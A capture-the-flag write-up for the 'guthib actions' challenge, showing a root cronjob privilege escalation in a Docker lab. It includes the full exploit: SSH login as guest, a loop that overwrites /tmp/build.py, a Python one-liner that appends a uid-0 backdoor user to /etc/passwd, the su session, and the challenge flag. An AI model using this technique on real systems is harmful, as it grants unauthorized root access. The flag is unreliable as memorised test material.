
# guthib actions

### Description

Jaga visits a software development company that uses a custom CI/CD system to build executables for their software every 1 minute. While CI/CD is a good practice in the industry, just like other companies in this world of vulnerabilities, the system administrators forgot to close a guest account on the build system. Rumour has it that the login details for this account can be found easily in one of the provided files. Luckily, this account does not have root access and cannot access the confidential information stored in the root directory...or can it?

# Solution

Basic knowledge of the Linux terminal is understood

## Looking at the Source code

I looked at the Dockerfile first.

```Dockerfile
FROM ubuntu:22.04

RUN apt-get update &&  \
    apt-get install -y python3 python3-pip openssh-server cron && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

RUN pip install pyinstaller && \
    pip cache purge

RUN useradd -m -c 'Restricted guest account' guest && \
    echo 'guest:guest' | chpasswd

RUN echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

RUN (crontab -l ; echo "* * * * * /root/build.sh") | crontab


COPY ./flag.py /root/flag.py
COPY ./build.sh /root/build.sh
COPY ./build.py /root/build.py
COPY ./start.sh /root/start.sh

RUN chown -R guest /home/guest && \
    chmod -R 700 /root && \
    chmod -R 777 /home/guest
EXPOSE 1337
ENTRYPOINT /root/start.sh
```

I then looked at the entrypoint `start.sh`

```sh
#!/bin/sh


mkdir /var/run/sshd && /usr/sbin/sshd -D -o ListenAddress=0.0.0.0 -p 1337 &
cron -f
```

Since there's a crontab to `build.sh` (`RUN (crontab -l ; echo "* * * * * /root/build.sh") | crontab`),  I looked at the relevant script

```bash
#!/bin/bash
cd /tmp  # dump all the temp files Pyinstaller may generate in the temp dir
cp /root/build.py build.py
python3 build.py >/dev/null 2>&1  # build flag printing binary
rm -r *
```

Overall the source code suggests

1. There is an account `guest:guest` that we can login to via the specified port through ssh
2. There's a cronjob to run a script as root -> **IMMEDIATELY** think about Privesc opportunities
	1. cronjob basically means that a script/code is run at regular time intervals automatically. 
3. This script runs `/tmp/build.py` which is a **writable location**. In other words we can control the code root runs
   4. We can then read `flag.py`

## Running code as root using Cronjob

This is a standard Linux privesc method, crontab. We write to `/tmp/build.py` which is ran by root in the cronjob script `build.sh`.

However, `/tmp/build.py` is created by `build.sh`. So what I was thinking is to keep creating `build.py` to overwrite the `build.py` and run our code. The logic would be something like this

1. **Start our bash while loop**
2. **our loop - overwrites** `/tmp/build.py` with custom code -> Happens many times
3. cronjob runs
4. cronjob - creates `/tmp/build.puy`
5. **our loop - overwrites** `/tmp/build.py` with custom code
6. cronjob - runs `/tmp/build.py`
7. **Ctrl-C to stop our while loop**

Then we WIN

## Code to run as Root

However but what code to run as root?

In this case I just added a new user by writing to /etc/passwd

You can add a new user with the same privileges as root/ change root passwd. Learn more about /etc/passwd format [here](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)

```bash
openssl passwd newpasswordhere
echo "<username>:<insert hash here>:0:0:root:/root:/bin/bash" >> /etc/passwd
```

eg. for credentials `dummyroot:password`

```bash
echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash" >> passwd
```

However to run as a python script, I used the `os` module

```python
import os; os.system('echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/usr/bin/bash" >> /etc/passwd')
```

I wrote this to the `/tmp/build.py` using `echo [text] > [file]`

## Final Exploit

Ignore the minor mistake I made about the quotations here, if you know you know. Either way it still works

Steps
1. Login via SSH using `guest:guest`
2. Create `/tmp/build.py`
3. Wait for cronjob to run
4. `su` to change user to `dummyroot` with password `password`
5. Read the flag file

```bash
┌──(kali㉿localhost)-[~]
└─$ ssh guest@157.245.52.169 -p 30496
The authenticity of host '[157.245.52.169]:30496 ([157.245.52.169]:30496)' can't be established.
ECDSA key fingerprint is SHA256:RSsiM3h7pSbWyvjc5JUbC5cl+YQuYr0Y4TvkNo7SVu0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[157.245.52.169]:30496' (ECDSA) to the list of known hosts.
guest@157.245.52.169's password:
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.10.0-0.bpo.15-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ bash
guest@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~$ echo "import os; os.system('echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/usr/bin/bash" >> /etc/passwd')" > test.py
guest@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~$ while :; do  cp test.py /tmp/build.py; done
^C
^C
guest@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~$ su dummyroot # password is password
Password:
root@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:/home/guest# cd ~
root@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~# cat flag.py
print('STF22{5up3r_5U5_5y5t3m_m0du13!_a0d66b3e608fe2b38ddf77d679fbde6b74e231f54c469a081f04dc65004360f8}')root@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~# python3 flag.py
STF22{5up3r_5U5_5y5t3m_m0du13!_a0d66b3e608fe2b38ddf77d679fbde6b74e231f54c469a081f04dc65004360f8}
root@ng-guthibactions-g5i4h-7f576d5bc4-hfrkg:~# 
```

## More Information

This is a relatively common privesc topic you can learn for Penetration Testing/ OSCP. I recommend looking at TryHackMe boxes for Privesc to learn.

# Flag

`STF22{5up3r_5U5_5y5t3m_m0du13!_a0d66b3e608fe2b38ddf77d679fbde6b74e231f54c469a081f04dc65004360f8}`
